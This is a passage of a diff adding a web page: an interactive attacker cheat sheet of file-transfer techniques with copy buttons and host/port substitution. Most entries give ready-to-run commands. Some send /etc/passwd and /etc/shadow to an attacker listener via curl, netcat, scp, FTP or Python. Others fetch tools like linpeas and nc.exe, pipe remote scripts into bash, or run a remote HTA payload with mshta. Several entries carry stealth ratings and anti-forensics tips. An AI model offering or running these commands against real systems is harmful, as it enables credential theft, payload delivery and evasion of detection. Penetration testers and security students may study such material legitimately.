+cat <&3 | tail -n +12 > /tmp/file.sh`
+},
+
+{
+  id:'lin-nc-dl',
+  name:'Linux — Netcat Receive',
+  platform:'linux',
+  direction:'download',
+  proto:'TCP (raw)',
+  tags:['netcat','nc','ncat','tcp'],
+  stealth:'high',
+  notes:'Simple TCP transfer. Attacker sends, target receives. No HTTP overhead.',
+  attacker:
+`# Send file (attacker → target)
+nc -q 0 LHOST_PLACEHOLDER LPORT < /path/to/file.sh
+
+# Alt: listen and serve (target connects to attacker)
+sudo nc -lvnp LPORT --send-only < /path/to/file.sh`,
+  target:
+`# Receive from attacker listener
+nc LHOST LPORT --recv-only > /tmp/file.sh
+
+# Alt: target listens, attacker sends
+nc -lvnp LPORT > /tmp/file.sh
+# then attacker runs: nc -q 0 TARGET LPORT < file.sh`
+},
+
+{
+  id:'lin-scp-dl',
+  name:'Linux — SCP / SFTP Download',
+  platform:'linux',
+  direction:'download',
+  proto:'SSH / TCP 22',
+  tags:['scp','sftp','ssh','encrypted'],
+  stealth:'high',
+  notes:'Encrypted. Use when SSH is available. Create temp account for transfers.',
+  attacker:
+`# Enable SSH (if needed)
+sudo systemctl start ssh`,
+  target:
+`# Pull from attacker to target
+scp attacker@LHOST:/path/to/tool.sh /tmp/tool.sh
+
+# Interactive SFTP
+sftp attacker@LHOST
+sftp> get /path/to/file /tmp/file
+sftp> exit
+
+# Pull with specific key
+scp -i /tmp/id_rsa attacker@LHOST:/tmp/tool.sh /tmp/`
+},
+
+{
+  id:'lin-base64-dl',
+  name:'Linux — Base64 Paste (no network)',
+  platform:'linux',
+  direction:'download',
+  proto:'No Network',
+  tags:['base64','clipboard','no-network','webshell'],
+  stealth:'medium',
+  notes:'No network needed. Works in web shells and restricted environments. Good for small files.',
+  attacker:
+`# Encode file
+cat /path/to/file | base64 -w0; echo
+
+# Verify
+md5sum /path/to/file`,
+  target:
+`# Paste base64 and decode
+echo -n "BASE64_STRING_HERE" | base64 -d > /tmp/file
+chmod +x /tmp/file
+
+# Verify
+md5sum /tmp/file`
+},
+
+// ─────────────────────────────────────────────────────────────
+// LINUX — UPLOAD
+// ─────────────────────────────────────────────────────────────
+{
+  id:'lin-curl-ul',
+  name:'Linux — curl Upload (multipart)',
+  platform:'linux',
+  direction:'upload',
+  proto:'HTTP',
+  tags:['curl','upload','multipart','exfiltration'],
+  stealth:'low',
+  notes:'Standard multipart upload. Use with uploadserver or custom handler on attacker.',
+  attacker:
+`# Start upload server
+pip3 install uploadserver
+python3 -m uploadserver LPORT`,
+  target:
+`# Upload single file
+curl -F 'files=@/etc/passwd' http://LHOST:LPORT/upload
+
+# Upload multiple files
+curl -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' http://LHOST:LPORT/upload`
+},
+
+{
+  id:'lin-nc-ul',
+  name:'Linux — Netcat Send',
+  platform:'linux',
+  direction:'upload',
+  proto:'TCP (raw)',
+  tags:['netcat','nc','exfiltration','tcp'],
+  stealth:'high',
+  notes:'Send file over raw TCP. No HTTP/FTP overhead. Hard to detect without deep packet inspection.',
+  attacker:
+`# Listen and receive
+nc -lvnp LPORT > received_file`,
+  target:
+`# Send file to listener
+nc LHOST LPORT < /etc/passwd
+
+# With timeout
+nc -q 1 LHOST LPORT < /etc/passwd`
+},
+
+{
+  id:'lin-scp-ul',
+  name:'Linux — SCP Push',
+  platform:'linux',
+  direction:'upload',
+  proto:'SSH / TCP 22',
+  tags:['scp','ssh','upload','encrypted'],
+  stealth:'high',
+  notes:'Encrypted. Push files to attacker over SSH. Remove keys when done.',
+  attacker:
+`# Enable SSH
+sudo systemctl start ssh`,
+  target:
+`# Push single file
+scp /etc/passwd attacker@LHOST:/tmp/
+
+# Push directory
+scp -r /var/log/ attacker@LHOST:/tmp/logs/
+
+# rsync over SSH (efficient, resumable)
+rsync -avz -e ssh /var/log/ attacker@LHOST:/tmp/logs/`
+},
+
+{
+  id:'lin-ftp-ul',
+  name:'Linux — FTP Upload',
+  platform:'linux',
+  direction:'upload',
+  proto:'FTP / TCP 21',
+  tags:['ftp','curl','upload'],
+  stealth:'low',
+  notes:'Simple FTP upload using curl or native ftp client.',
+  attacker:
+`# FTP server with write enabled
+sudo python3 -m pyftpdlib --port 21 --write`,
+  target:
+`# curl FTP upload
+curl -T /etc/passwd ftp://anonymous:@LHOST/
+
+# Alt: ftp client
+ftp LHOST
+ftp> put /etc/passwd`
+},
+
+{
+  id:'lin-python-ul',
+  name:'Linux — Python requests Upload',
+  platform:'linux',
+  direction:'upload',
+  proto:'HTTP',
+  tags:['python','requests','upload','http'],
+  stealth:'low',
+  notes:'One-liner upload using Python requests. No curl needed.',
+  attacker:
+`# Upload server
+python3 -m uploadserver LPORT`,
+  target:
+`python3 -c 'import requests; requests.post(
+  "http://LHOST:LPORT/upload",
+  files={"files": open("/etc/passwd","rb")}
+)'`
+},
+
+// ─────────────────────────────────────────────────────────────
+// CODE — DOWNLOAD
+// ─────────────────────────────────────────────────────────────
+{
+  id:'code-python2-dl',
+  name:'Python 2 — urllib Download',
+  platform:'code',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['python','python2','urllib','one-liner'],
+  stealth:'medium',
+  notes:'Python 2 one-liner. Useful on older systems where only Python 2 is available.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`python2.7 -c 'import urllib; urllib.urlretrieve("http://LHOST:LPORT/linpeas.sh","linpeas.sh")'`
+},
+
+{
+  id:'code-python3-dl',
+  name:'Python 3 — urllib Download',
+  platform:'code',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['python','python3','urllib','one-liner'],
+  stealth:'medium',
+  notes:'Python 3 one-liner. Clean and reliable on modern Linux targets.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`python3 -c 'import urllib.request; urllib.request.urlretrieve("http://LHOST:LPORT/linpeas.sh","linpeas.sh")'`
+},
+
+{
+  id:'code-php-dl',
+  name:'PHP — file_get_contents Download',
+  platform:'code',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['php','one-liner','download','webshell'],
+  stealth:'medium',
+  notes:'Useful in web shell contexts or when PHP is available. file_get_contents + file_put_contents.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`# Method 1: file_get_contents
+php -r '$f=file_get_contents("http://LHOST:LPORT/linpeas.sh");file_put_contents("linpeas.sh",$f);'
+
+# Method 2: fopen with buffer
+php -r 'const BUFFER=1024;$r=fopen("http://LHOST:LPORT/linpeas.sh","rb");$w=fopen("linpeas.sh","wb");while($b=fread($r,BUFFER)){fwrite($w,$b);}fclose($w);fclose($r);'
+
+# Pipe to bash (fileless)
+php -r '$lines=@file("http://LHOST:LPORT/script.sh");foreach($lines as $l){echo $l;}' | bash`
+},
+
+{
+  id:'code-ruby-dl',
+  name:'Ruby — Net::HTTP Download',
+  platform:'code',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['ruby','net-http','one-liner'],
+  stealth:'medium',
+  notes:'Ruby one-liner. Available on many Linux systems. Uses Net::HTTP from stdlib.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`ruby -e 'require "net/http"; File.write("linpeas.sh", Net::HTTP.get(URI.parse("http://LHOST:LPORT/linpeas.sh")))'`
+},
+
+{
+  id:'code-perl-dl',
+  name:'Perl — LWP::Simple Download',
+  platform:'code',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['perl','lwp','one-liner'],
+  stealth:'medium',
+  notes:'Perl with LWP::Simple. Often pre-installed on older Linux systems.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`perl -e 'use LWP::Simple; getstore("http://LHOST:LPORT/linpeas.sh","linpeas.sh");'`
+},
+
+// ─────────────────────────────────────────────────────────────
+// LOTL — WINDOWS
+// ─────────────────────────────────────────────────────────────
+{
+  id:'lotl-certutil',
+  name:'certutil.exe — Download',
+  platform:'lotl',
+  direction:'download',
+  proto:'HTTP/S',
+  tags:['certutil','windows-builtin','lolbas','bypass'],
+  stealth:'low',
+  notes:'Built-in, no PS needed. High detection rate on modern EDRs. Cache artifacts left behind.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`# Standard download
+certutil.exe -urlcache -split -f http://LHOST:LPORT/nc.exe C:\\Users\\Public\\nc.exe
+
+# Alternative flag
+certutil.exe -verifyctl -split -f http://LHOST:LPORT/nc.exe
+
+# Clear urlcache afterward (anti-forensics)
+certutil.exe -urlcache -split -f http://LHOST:LPORT/nc.exe delete`
+},
+
+{
+  id:'lotl-bitsadmin',
+  name:'bitsadmin — Download (LOLBAS)',
+  platform:'lotl',
+  direction:'download',
+  proto:'HTTP/S / SMB',
+  tags:['bitsadmin','bits','windows-builtin','lolbas'],
+  stealth:'medium',
+  notes:'Background download service. Survives reboots until job completes. Deprecated but still works.',
+  attacker:
+`python3 -m http.server LPORT`,
+  target:
+`# bitsadmin
+bitsadmin /transfer job /priority foreground http://LHOST:LPORT/nc.exe C:\\Users\\Public\\nc.exe
+
+# PowerShell BITS
+Import-Module bitstransfer
+Start-BitsTransfer -Source "http://LHOST:LPORT/nc.exe" -Destination "C:\\Users\\Public\\nc.exe"`
+},
+
+{
+  id:'lotl-mshta',
+  name:'mshta.exe — Remote Execute',
+  platform:'lotl',
+  direction:'execute',
+  proto:'HTTP/S',
+  tags:['mshta','hta','lolbas','execute','windows-builtin'],
+  stealth:'medium',
+  notes:'Executes HTA files. Can run remote scripts. Commonly used in phishing + bypass.',
+  attacker:
+`# Create payload.hta
+cat > /tmp/share/payload.hta << 'EOF'
+<html><body><script language="VBScript">
+  Set s = CreateObject("WScript.Shell")
+  s.Run "cmd /c whoami > C:\\temp\\out.txt",0,True
+  self.close
+</script></body></html>
+EOF
+python3 -m http.server LPORT`,
+  target:
+`mshta.exe http://LHOST:LPORT/payload.hta`
+},
+
+{
+  id:'lotl-openssl',
+  name:'openssl — Encrypted Transfer (LOTL)',
+  platform:'lotl',
+  direction:'download',
+  proto:'TLS / Any Port',
+  tags:['openssl','tls','encrypted','linux','lolbas','gtfobins'],
+  stealth:'high',
+  notes:'Encrypted transfer using openssl. Works on Linux. Listed on GTFOBins.',
+  attacker:
+`# Create cert
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 1 -out cert.pem -subj '/CN=x'
+
+# Serve file over TLS
+openssl s_server -quiet -accept LPORT -cert cert.pem -key key.pem < /tmp/linpeas.sh`,
+  target:
+`# Download over TLS
+openssl s_client -quiet -connect LHOST:LPORT > /tmp/linpeas.sh 2>/dev/null`
+},
+
+// ─────────────────────────────────────────────────────────────
+// SERVER SETUP (ATTACKER-SIDE)
+// ─────────────────────────────────────────────────────────────
+{
+  id:'srv-python-http',
+  name:'Python — HTTP Server',
+  platform:'server',
+  direction:'download',
+  proto:'HTTP / TCP',
+  tags:['python','http','server','simple','quick'],
+  stealth:'n/a',
+  notes:'Serves current directory. Download only (no uploads). Quick and ubiquitous.',
+  attacker:
+`# Serve current directory
+python3 -m http.server LPORT
+
+# Serve specific directory
+python3 -m http.server LPORT --directory /tmp/share
+
+# Python 2 equivalent
+python2 -m SimpleHTTPServer LPORT`
+},
+
+{
+  id:'srv-uploadserver',
+  name:'Python — uploadserver (HTTP)',
+  platform:'server',
+  direction:'upload',
+  proto:'HTTP / TCP',
+  tags:['uploadserver','python','http','upload','server'],
+  stealth:'n/a',
+  notes:'Supports both download and upload. Upload endpoint at /upload.',
+  attacker:
+`# Install
+pip3 install uploadserver
+
+# Start on custom port
+python3 -m uploadserver LPORT
+
+# Upload test
+curl -F 'files=@/etc/passwd' http://LHOST:LPORT/upload`
+},
+
+{
+  id:'srv-uploadserver-https',
+  name:'Python — uploadserver (HTTPS)',
+  platform:'server',
+  direction:'upload',
+  proto:'HTTPS / TCP',
+  tags:['uploadserver','python','https','tls','server'],
+  stealth:'n/a',
+  notes:'Encrypted upload server. Use -k on curl to ignore self-signed cert.',
+  attacker:
+`# Generate self-signed cert
+openssl req -x509 -newkey rsa:2048 -nodes -sha256 -subj '/CN=srv' \
+  -keyout server.pem -out server.pem
+
+# Start HTTPS upload server
+python3 -m uploadserver 443 --server-certificate server.pem`,
+  target:
+`# Upload (ignore cert)
+curl -k -F 'files=@/etc/passwd' https://LHOST/upload`
+},
+
+{
+  id:'srv-impacket-smb',
+  name:'impacket — SMB Server',
+  platform:'server',
+  direction:'download',
+  proto:'SMB / TCP 445',
+  tags:['impacket','smbserver','smb','445','server'],
+  stealth:'n/a',
+  notes:'Quick SMB share for Windows targets. Use auth version for modern Windows.',
+  attacker:
+`# No auth (older Windows / Linux)
+sudo impacket-smbserver share -smb2support /tmp/share
+
+# With credentials (modern Windows)
+sudo impacket-smbserver share -smb2support /tmp/share \
+  -user s2k7x -password 'P@ss123'`
+},
+
+{
+  id:'srv-webdav',
+  name:'wsgidav — WebDAV Server',
+  platform:'server',
+  direction:'download',
+  proto:'HTTP / TCP 80',
+  tags:['webdav','wsgidav','http','server'],
+  stealth:'n/a',
+  notes:'WebDAV over HTTP. Windows mounts it via \\\\host\\DavWWWRoot UNC path.',
+  attacker:
+`# Install
+pip3 install wsgidav cheroot
+
+# Start anonymous WebDAV server
+sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp/share --auth=anonymous`
+},
+
+{
+  id:'srv-pyftpdlib-ro',
+  name:'pyftpdlib — FTP Server (read)',
+  platform:'server',
+  direction:'download',
+  proto:'FTP / TCP 21',
+  tags:['ftp','pyftpdlib','server','anonymous'],
+  stealth:'n/a',
+  notes:'Anonymous FTP server for downloads. Port 21 requires sudo.',
+  attacker:
+`# Install
+pip3 install pyftpdlib
+
+# Read-only anonymous FTP
+sudo python3 -m pyftpdlib --port 21
+
+# Custom port (no sudo needed)
+python3 -m pyftpdlib --port 2121`
+},
+
+{
+  id:'srv-pyftpdlib-rw',
+  name:'pyftpdlib — FTP Server (read+write)',
+  platform:'server',
+  direction:'upload',
+  proto:'FTP / TCP 21',
+  tags:['ftp','pyftpdlib','server','upload','write'],
+  stealth:'n/a',
+  notes:'FTP server that accepts uploads (--write flag). Good for receiving exfiltrated files.',
+  attacker:
+`# Read+write FTP server
+sudo python3 -m pyftpdlib --port 21 --write
+
+# Check received files
+ls -la /tmp/`
+},
+
+{
+  id:'srv-nc-receive',
+  name:'Netcat — Receive File',
+  platform:'server',
+  direction:'upload',
+  proto:'TCP (raw)',
+  tags:['netcat','nc','ncat','server','receive'],
+  stealth:'n/a',
+  notes:'One-time file receiver over raw TCP. Simple and portable.',
+  attacker:
+`# Listen and receive
+nc -lvnp LPORT > received_file
+
+# Ncat version
+ncat -lvnp LPORT --recv-only > received_file`
+},
+
+{
+  id:'srv-nc-send',
+  name:'Netcat — Send File',
+  platform:'server',
+  direction:'download',
+  proto:'TCP (raw)',
+  tags:['netcat','nc','ncat','server','send'],
+  stealth:'n/a',
+  notes:'Serve a single file over raw TCP. Target connects and receives.',
+  attacker:
+`# Serve file (target connects to get it)
+nc -lvnp LPORT < /path/to/file.exe
+
+# Ncat version
+ncat -lvnp LPORT --send-only < /path/to/file.exe`
+},
+
+];
+
+// ─────────────────────────────────────────────────────────────
+// STATE
+// ─────────────────────────────────────────────────────────────
+let activePlatform = 'all';
+let activeDir      = 'all';
+let searchQuery    = '';
+let lhost          = '10.10.14.5';
+let lport          = '8000';
+
+// ─────────────────────────────────────────────────────────────
+// RENDER
+// ─────────────────────────────────────────────────────────────
+function substitute(text) {
+  if (!text) return '';
+  return text
+    .replace(/LHOST/g, lhost || 'LHOST')
+    .replace(/LPORT/g, lport || 'LPORT');
+}
+
+function stealthClass(s) {
+  if (s === 'high')   return 'stealth-high';
+  if (s === 'medium') return 'stealth-medium';
+  if (s === 'low')    return 'stealth-low';
+  return '';
+}
+
+function dirBadge(d) {
+  if (d === 'download') return '<span class="badge badge-dir-dl">⬇ Download</span>';
+  if (d === 'upload')   return '<span class="badge badge-dir-ul">⬆ Upload</span>';
+  if (d === 'execute')  return '<span class="badge badge-dir-exec">⚡ Execute</span>';
+  return '';
+}
+
+function highlightCmd(raw) {
+  // Escape HTML, then syntax-highlight
+  let t = raw
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;');
+  // highlight comments
+  t = t.replace(/(#[^\n]*)/g, '<span class="c">$1</span>');
+  return t;
+}
+
+function renderCard(tech) {
+  const stClass = tech.stealth && tech.stealth !== 'n/a' ? stealthClass(tech.stealth) : '';
+  const stLabel = tech.stealth && tech.stealth !== 'n/a'
+    ? `<span class="stealth-indicator ${stClass}"><span class="stealth-dot"></span>${tech.stealth.toUpperCase()}</span>`
+    : '';
+
+  const tagHtml = tech.tags.map(t => `<span class="tag">${t}</span>`).join('');
+
+  let bodyHtml = '';
+
+  if (tech.notes) {
+    bodyHtml += `<div class="card-notes">${tech.notes}</div>`;
+  }
+
+  bodyHtml += `<div class="cmd-sections">`;
+
+  if (tech.attacker) {
+    const cmd = substitute(tech.attacker);
+    bodyHtml += `
+      <div class="cmd-block">
+        <div class="cmd-label attacker-label">
+          <span class="cmd-label-text">⚡ Attacker Setup</span>
+          <button class="copy-btn" onclick="copyCmd(this,'${escapeJs(cmd)}')">
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            Copy
+          </button>
+        </div>
+        <pre class="cmd">${highlightCmd(cmd)}</pre>
+      </div>`;
+  }
+
+  if (tech.target) {
+    const cmd = substitute(tech.target);
+    bodyHtml += `
+      <div class="cmd-block">
+        <div class="cmd-label target-label">
+          <span class="cmd-label-text">🎯 Target Execution</span>
+          <button class="copy-btn" onclick="copyCmd(this,'${escapeJs(cmd)}')">
+            <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+            Copy
+          </button>
+        </div>
+        <pre class="cmd">${highlightCmd(cmd)}</pre>
+      </div>`;
+  }
+
+  bodyHtml += `</div>`;
+
+  // For server-only cards (no target)
+  if (!tech.attacker && !tech.target) {
+    bodyHtml += `<div class="cmd-sections"><div class="card-notes">No commands.</div></div>`;
+  }
+
+  return `
+    <div class="card" data-platform="${tech.platform}" data-direction="${tech.direction}" id="card-${tech.id}">
+      <div class="card-head" onclick="toggleCard('${tech.id}')">
+        <span class="platform-dot"></span>
+        <span class="card-name">${tech.name}</span>
+        <span class="badge badge-proto">${tech.proto}</span>
+        ${dirBadge(tech.direction)}
+        ${stLabel}
+        <span class="chevron">▼</span>
+      </div>
+      <div class="card-body">
+        ${bodyHtml}
+        <div style="padding:0 18px 12px;"><div class="card-tags">${tagHtml}</div></div>
+      </div>
+    </div>`;
+}
+
+function escapeJs(s) {
+  return s.replace(/\\/g,'\\\\').replace(/'/g,"\\'").replace(/\n/g,'\\n').replace(/\r/g,'');
+}
+
+function render() {
+  const q = searchQuery.toLowerCase();
+
+  const filtered = TECHNIQUES.filter(t => {
+    if (activePlatform !== 'all' && t.platform !== activePlatform) return false;
+    if (activeDir !== 'all' && t.direction !== activeDir) return false;
+    if (q) {
+      const haystack = [t.name, t.platform, t.direction, t.proto, ...t.tags, t.notes||''].join(' ').toLowerCase();
+      if (!haystack.includes(q)) return false;
+    }
+    return true;
+  });
+
+  const container = document.getElementById('techniques-list');
+  if (filtered.length === 0) {
+    container.innerHTML = `<div class="empty">No techniques match your filters.</div>`;
+  } else {
+    container.innerHTML = filtered.map(renderCard).join('');
+  }
+
+  document.getElementById('count-badge').textContent = filtered.length + ' technique' + (filtered.length !== 1 ? 's' : '');
+}
+
+// ─────────────────────────────────────────────────────────────
+// INTERACTIONS
+// ─────────────────────────────────────────────────────────────
+function toggleCard(id) {
+  const el = document.getElementById('card-' + id);
+  if (el) el.classList.toggle('open');
+}
+
+function copyCmd(btn, text) {
+  // Unescape newlines
+  const raw = text.replace(/\\n/g,'\n');
+  navigator.clipboard.writeText(raw).then(() => {
+    btn.classList.add('copied');
+    btn.innerHTML = `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg> Copied!`;
+    setTimeout(() => {
+      btn.classList.remove('copied');
+      btn.innerHTML = `<svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy`;
+    }, 1800);
+  }).catch(() => {
+    // fallback: select+copy
+    const ta = document.createElement('textarea');
+    ta.value = raw;
+    ta.style.cssText = 'position:fixed;opacity:0;';
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand('copy');
+    document.body.removeChild(ta);
+  });
+}
+
+// Tab clicks
+document.getElementById('tabs').addEventListener('click', e => {
+  const t = e.target.closest('.tab');
+  if (!t) return;
+  document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+  t.classList.add('active');
+  activePlatform = t.dataset.platform;
+  render();
+});
+
+// Direction pill clicks
+document.querySelector('.dir-row').addEventListener('click', e => {
+  const p = e.target.closest('.dir-pill');
+  if (!p) return;
+  document.querySelectorAll('.dir-pill').forEach(x => x.classList.remove('active'));
+  p.classList.add('active');
+  activeDir = p.dataset.dir;
+  render();
+});
+
+// IP/Port inputs
+let renderTimer;
+function scheduleRender() {
+  clearTimeout(renderTimer);
+  renderTimer = setTimeout(render, 80);
+}
+
+document.getElementById('lhost').addEventListener('input', e => {
+  lhost = e.target.value;
+  scheduleRender();
+});
+
+document.getElementById('lport').addEventListener('input', e => {
+  lport = e.target.value;
+  scheduleRender();
+});
+
+document.getElementById('search').addEventListener('input', e => {
+  searchQuery = e.target.value;
+  render();
+});
+
+// Initial render
+render();
+</script>
+</body>
+</html>
